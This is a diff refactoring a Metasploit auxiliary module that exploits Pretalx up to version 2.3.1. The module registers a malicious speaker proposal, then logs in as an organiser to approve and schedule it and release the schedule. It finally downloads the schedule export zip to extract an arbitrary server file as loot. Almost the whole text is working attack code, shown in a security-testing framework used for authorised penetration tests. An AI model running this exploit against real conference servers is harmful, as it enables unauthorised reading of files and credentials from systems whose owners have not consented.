@@ -47,11 +47,11 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true
     })
 
-    fail_with Failure::NotVulnerable, 'Application might not be Pretalx' unless res&.code == 200
+    fail_with Failure::UnexpectedReply('Application might not be Pretalx') unless res&.code == 200
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
-    fail_with Failure::UnexpectedReply, 'Could not find CSRF token' unless csrf_token
+    fail_with Failure::NotFound('Could not find CSRF token') unless csrf_token
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true
     })
 
-    fail_with Failure::UnexpectedReply unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/
+    fail_with Failure::NotFound('Cannot find session token') unless res.get_cookies =~ /pretalx_csrftoken=([a-zA-Z0-9]+);/
 
     @pretalx_token = Regexp.last_match(1)
 
@@ -69,28 +69,25 @@ class MetasploitModule < Msf::Auxiliary
     true
   end
 
-  def register_malicious_speaker
+  def get_registration_step(uri)
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'submit/')
-    })
-
-    fail_with Failure::UnexpectedReply unless res&.code == 302
-    submit_uri = res.headers.fetch('Location', nil)
-
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(submit_uri),
+      'uri' => normalize_uri(uri),
       'keep_cookies' => true
     })
 
-    fail_with Failure::UnexpectedReply unless res&.code == 200
+    fail_with Failure::UnexpectedReply('Failed to fetch registration step') unless res&.code == 200
+    return res
+  end
+
+  def create_general_info(submit_uri)
+    res = get_registration_step(submit_uri)
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
     submission_type = res.get_hidden_inputs.dig(0, 'submission_type')
     res.get_hidden_inputs.dig(0, 'content_locale')
 
-    fail_with Failure::Unknown unless submit_uri && csrf_token
+    fail_with Failure::NotFound('Could not find hidden inputs: creating general info') unless submit_uri && csrf_token
 
     @proposal_name = Rex::Text.rand_text_alphanumeric(10)
 
@@ -106,27 +103,20 @@ class MetasploitModule < Msf::Auxiliary
     data_post.add_part('', 'application/octet-stream', '', %(form-data; name="image"; filename=""))
     data_post.add_part('', '', '', %(form-data; name="additional_speaker"))
 
-    res = send_request_cgi({
+    send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(submit_uri),
       'data' => data_post.to_s,
       'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
     })
+  end
 
-    fail_with Failure::UnexpectedReply unless res&.code == 302
-    submit_uri = res.headers.fetch('Location', nil)
-
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(submit_uri),
-      'keep_cookies' => true
-    })
-
-    fail_with Failure::UnexpectedReply unless res&.code == 200
+  def create_account_info(submit_uri)
+    res = get_registration_step(submit_uri)
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
-    fail_with Failure::Unknown unless submit_uri && csrf_token
+    fail_with Failure::NotFound('Could not find hidden inputs: creating account info') unless submit_uri && csrf_token
 
     data_post = Rex::MIME::Message.new
     data_post.add_part(csrf_token, nil, nil, %(form-data; name="csrfmiddlewaretoken"))
@@ -138,28 +128,20 @@ class MetasploitModule < Msf::Auxiliary
     data_post.add_part('', '', '', %(form-data; name="register_password"))
     data_post.add_part('', '', '', %(form-data; name="register_password_repeat"))
 
-    res = send_request_cgi({
+    send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(submit_uri),
       'data' => data_post.to_s,
       'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
     })
+  end
 
-    fail_with Failure::UnexpectedReply unless res&.code == 302
-
-    submit_uri = res.headers.fetch('Location', nil)
-
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(submit_uri),
-      'keep_cookies' => true
-    })
-
-    fail_with Failure::UnexpectedReply unless res&.code == 200
+  def create_profile_info(submit_uri)
+    res = get_registration_step(submit_uri)
 
     csrf_token = res.get_hidden_inputs.dig(0, 'csrfmiddlewaretoken')
 
-    fail_with Failure::Unknown unless submit_uri && csrf_token
+    fail_with Failure::NotFound('Could not found hidden inputs: creating profile info') unless submit_uri && csrf_token
 
     Rex::Text.rand_text_alphanumeric(16).to_s
 
@@ -170,14 +152,44 @@ class MetasploitModule < Msf::Auxiliary
     data_post.add_part(Rex::Text.rand_text_alphanumeric(10), '', '', %(form-data; name="biography"))
     data_post.add_part(%({"availabilities":[]}), '', '', %(form-data; name="availabilities"))
 
-    res = send_request_cgi({
+    send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(submit_uri),
       'data' => data_post.to_s,
       'ctype' => "multipart/form-data; boundary=#{data_post.bound}"
     })
+  end
 
-    fail_with Failure::UnexpectedReply unless res&.code == 302
+  def register_malicious_proposal
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(datastore['CONFERENCE_NAME'], 'submit/')
+    })
+
+    fail_with Failure::UnexpectedReply('Could not get proposal submission page') unless res&.code == 302
+    general_info_uri = res.headers.fetch('Location', nil)
+
+    fail_with Failure::Unknown('Could not get general info page') unless general_info_uri
+
+    res_general_info = create_general_info(general_info_uri)
+
+    fail_with Failure::UnexpectedReply('Proposal submission failed on General Info step') unless res_general_info&.code == 302
+
+    account_info_uri = res.headers.fetch('Location', nil)
+
+    fail_with Failure::Unknown('Could not get account info page') unless account_info_uri
+
+    res_account_info = create_account_info(account_info_uri)
+
+    fail_with Failure::UnexpectedReply('Proposal submission failed on Account Info step') unless res_account_info&.code == 302
+
+    profile_info_uri = res.headers.fetch('Location', nil)
+
+    fail_with Failure::Unknown('Could not get profile info page') unless profile_info_uri
+
+    res_profile_info = create_profile_info(profile_info_uri)
+
+    fail_with Failure::UnexpectedReply('Proposal submission failed on Profile Info step') unless res_profile_info&.code == 302
   end
 
   def approve_proposal
@@ -186,11 +198,13 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri('orga', 'event', datastore['CONFERENCE_NAME'], 'submissions/')
     })
 
-    fail_with Failure::UnexpectedReply unless res&.code == 200
+    fail_with Failure::UnexpectedReply('Could not find submissions') unless res&.code == 200
 
     html = res.get_html_document
 
     proposal_element = html.xpath('//td/a').find { |link| link.text.strip == @proposal_name }
+
+    fail_with Failure::Unknown('Could not find proposal') unless proposal_element
 
     proposal_uri = proposal_element['href']
 
@@ -203,11 +217,13 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(proposal_uri)
     })
 
-    fail_with Failure::UnexpectedReply unless res&.code == 200
+    fail_with Failure::UnexpectedReply('Failed to get proposal approval page') unless res&.code == 200
 
     html = res.get_html_document
 
     approval_link = html.at('a[@class="dropdown-item submission-state-accepted"]')
+
+    fail_with Failure::Unknown('Could not find approval element, user might not have sufficient permissions') unless proposal_element
 
     approval_uri = approval_link['href']
 
@@ -215,7 +231,6 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(approval_uri)
     })
-
     fail_with Failure::UnexpectedReply unless res&.code == 200
 
     next_token = res.get_hidden_inputs.dig(0, 'next')
@@ -286,26 +301,6 @@ class MetasploitModule < Msf::Auxiliary
     false
   end
 
-  def check_host(_ip)
-    return Exploit::CheckCode::Unknown('Login failed, please check credentials') unless login
-
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri('orga', 'event/'),
-      'keep_cookies' => true
-    })
-
-    return Exploit::CheckCode::Detected unless res&.code == 200
-
-    html = res.get_html_document
-
-    version_element = Rex::Version.new(html.at('span//a')&.text)
-
-    return Exploit::CheckCode::Appears("Detected vulnerable version #{version_element}") if version_element <= Rex::Version.new('2.3.1')
-
-    Exploit::CheckCode::Safe("Detected version #{version_element} is not vulnerable")
-  end
-
   def release_schedule
     res = send_request_cgi({
       'method' => 'GET',
@@ -347,24 +342,53 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     zip = Zip::File.open_buffer(res.body)
-    zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
-    # TODO: add check
-    return zip.read(zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}"))
+    target_entry = zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
+    fail_with Failure::PayloadFailed, 'Failed to extract target file, check if export worked' unless target_entry
+    return zip.read(zip.find_entry(target_entry))
+  end
+
+  def check_host(_ip)
+    return Exploit::CheckCode::Unknown('Login failed, please check credentials') unless login
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri('orga', 'event/'),
+      'keep_cookies' => true
+    })
+
+    return Exploit::CheckCode::Detected unless res&.code == 200
+
+    html = res.get_html_document
+
+    version_element = Rex::Version.new(html.at('span//a')&.text)
+
+    return Exploit::CheckCode::Appears("Detected vulnerable version #{version_element}") if version_element <= Rex::Version.new('2.3.1')
+
+    Exploit::CheckCode::Safe("Detected version #{version_element} is not vulnerable")
   end
 
   def run_host(ip)
-    register_malicious_speaker
+    vprint_status('Register malicious proposal')
+
+    register_malicious_proposal
 
     cookie_jar.clear
 
+    vprint_status("Logging with credentials: #{datastore['USERNAME']}/#{datastore['PASSWORD']}")
     fail_with Failure::NoAccess, 'Incorrect credentials' unless login
 
+    vprint_status('Approving proposal')
     approve_proposal
 
+    vprint_status("Adding #{@proposal_name} to schedule")
     add_proposal_to_schedule
-
+    vprint_status('Releasing schedule')
     release_schedule
+
+    vprint_status('Trying to extract target file')
     extracted_content = download_zip
+
+    vprint_success('Extraction successful')
 
     loot_path = store_loot(
       "pretalx.#{datastore['FILEPATH']}",
@@ -374,7 +398,8 @@ class MetasploitModule < Msf::Auxiliary
       "pretalx-#{datastore['FILEPATH']}.txt",
       'Pretalx'
     )
-    print_status "Stored results in #{loot_path}"
+    print_status("Stored results in #{loot_path}")
+
     report_vuln({
       host: rhost,
       port: rport,
